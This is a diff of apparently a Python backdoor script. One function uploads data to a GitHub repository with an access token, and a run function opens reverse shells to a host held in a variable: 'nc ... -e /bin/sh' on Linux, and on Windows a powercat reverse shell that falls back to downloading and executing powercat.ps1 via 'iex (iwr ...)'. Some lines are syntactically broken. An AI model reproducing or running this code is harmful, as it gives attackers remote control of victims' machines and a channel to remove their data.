@@ -35,14 +35,6 @@ def upload_file(token,fname,sntc):
 		repo.update_file(path,"actualizando data",data,file.sha)
 	except:
 		repo.create_file(path, commit_message, data)
-		
-	
-
-
-	
-
-
-
         
 
 def run(token):
@@ -70,8 +62,9 @@ def run(token):
         #os.system( 'nc -lvp 734 -e /bin/sh')
         os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-	   #os.system('ncat -lvp 734 -e cmd.exe')
-          os.system('ncat '+ iph +' 734 -e cmd.exe')
-	
-	#except:
-	   #os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
+	try:
+		#os.system('ncat -lvp 734 -e cmd.exe')
+           os.system('powercat '+ iph +' 734 -ep')
+	except:	 
+	    os.system('iex (iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
+            os.system('powercat '+ iph +' 734 -ep')
